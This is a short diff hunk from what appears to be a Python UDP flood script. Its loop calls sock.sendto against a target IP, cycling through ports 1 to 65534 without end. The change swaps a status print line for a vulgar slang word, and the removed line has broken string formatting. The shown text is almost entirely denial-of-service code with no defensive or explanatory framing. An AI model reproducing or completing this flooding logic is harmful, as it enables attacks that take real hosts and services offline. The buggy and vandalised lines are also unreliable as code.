@@ -24,7 +24,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
+     print("kontol")    
      if port == 65534:
        port = 1
      
